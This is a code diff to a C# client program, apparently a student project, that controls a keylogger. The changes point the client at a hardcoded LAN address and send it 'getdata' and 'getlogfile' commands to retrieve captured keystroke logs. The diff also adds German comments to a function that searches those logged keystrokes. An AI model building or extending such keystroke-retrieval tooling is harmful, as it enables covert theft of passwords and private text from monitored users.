@@ -24,6 +24,7 @@ namespace IdpaClient
         private AutoCompleteStringCollection dateSource = new AutoCompleteStringCollection();
         private AutoCompleteStringCollection wNameSource = new AutoCompleteStringCollection();
         private AutoCompleteStringCollection aNameSource = new AutoCompleteStringCollection();
+        private string IpAddress = "192.168.178.33";
 
         private PcInfromations pcInformations = new PcInfromations();
 
@@ -32,6 +33,9 @@ namespace IdpaClient
             InitializeComponent();
             logger = new Logger();
             GetKeyLoggerData();
+
+            Task t = new Task(() => getPcInformations());
+            t.Start(TaskScheduler.FromCurrentSynchronizationContext());
         }
 
         //UI Events
@@ -45,7 +49,7 @@ namespace IdpaClient
         {
             print("Starting download...");
             adressInfo.Stop();
-            if (ConnectionManager.SendCommand("127.0.0.1", "getdata"))
+            if (ConnectionManager.SendCommand(IpAddress, "getdata"))
             {
                 //Task.Factory.StartNew(() => ConnectionManager.startAsyncTCPListener(2));
                 Task t = new Task(() => ConnectionManager.startAsyncTCPListener(2));
@@ -58,7 +62,7 @@ namespace IdpaClient
         private async void refreshLogFile_Click(object sender, EventArgs e)
         {
             adressInfo.Stop();
-            if (ConnectionManager.SendCommand("127.0.0.1", "getlogfile"))
+            if (ConnectionManager.SendCommand(IpAddress, "getlogfile"))
             {
                 Task t = new Task(() => ConnectionManager.startAsyncTCPListener(1));
                 t.Start(TaskScheduler.FromCurrentSynchronizationContext());
@@ -256,26 +260,36 @@ namespace IdpaClient
 
         private void SearchText()
         {
+            //Erstelle eine neue Liste mit int Elementen
             List<int> appIndexes = new List<int>();
 
+            //Durchsuche jedes ApplicationLog element im Logger Objekt
             for (int i = 0; i < logger.applicationLog.Count; i++ )
             {
+                //Speichere das Elemnt in eine neue Variablen
                 ApplicationLog app = logger.applicationLog[i];
 
+                //Erstellen eine leere String Variabel
                 string keyString = "";
 
+                //Für jede gespeicherte Tase im Application Log
+                //Füge die Taste am ende des Strings an
                 foreach (string key in app.keyList)
                 {
                     keyString += key;
                 }
 
+                //Formatiere den String
                 keyString = ReplaceKeyStrings(keyString);
 
+                //Wenn der eingegbene Begriff in dem Suchfenster im String vorkommt
                 if (keyString.ToLower().Contains(searchBox.Text.ToLower()))
                 {
+                    //Speichere den Index dieses Eintrages
                     appIndexes.Add(i);
                 }
             }
+            //Füge die Eintrage in der Tabelle ein
             UpdateRows(appIndexes.ToArray());
         }
 
